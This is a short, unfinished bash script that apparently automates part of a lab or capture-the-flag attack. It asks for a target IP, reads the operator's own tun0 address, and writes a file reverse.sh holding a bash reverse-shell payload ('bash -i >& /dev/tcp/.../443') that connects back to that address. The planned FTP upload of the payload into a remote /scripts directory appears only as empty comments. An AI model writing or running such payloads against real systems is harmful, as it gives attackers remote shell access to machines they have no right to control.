#!/bin/bash

color_yellow_1="\e[33m"
color_yellow_2="\e[93m"
color_green="\e[92m"
color_red="\e[91m"
color_reset="\e[0m"

#Obtaining IP Addresses of Attacker and Victim
echo -e "${color_yellow_1}Introduce the IP of the Target Machine: ${color_reset}"
read -p '' ip_victim

tun0=$(ifconfig tun0 | grep 'inet' | awk '{print $2}' | head -n 1)

if [ $? -eq 0 ]; then
  echo -e "${color_green}[+]${color_reset} I detected your IP is $tun0 and the target IP is $ip_victim"
else
  echo -e "${color_red}[+]${color_reset} Error in the process of capture your IP"
  exit 1
fi

sleep 2

#Creation of reverse.sh file that contains payload to Reverse Shell
echo -e "${color_green}[+]${color_reset} I am creating a script called reverse.sh with the payload of Reverse Shell"

echo -e '#!/bin/bash\n\nbash -i >& /dev/tcp/'"$tun0"'/443 0>&1' >> reverse.sh

test -f reverse.sh

if [ $? -eq 0 ]; then
  echo -e "${color_green}[+]${color_reset} The creation of reverse.sh file is successful"
else
  echo -e "${color_red}[+]${color_reset} There was an error in the creation of reverse.sh file"
  exit 1
fi

#Configuration of FTP Server

#Route and name of local file

#Route and name of remote file in /scripts directory

#FTP command to upload file
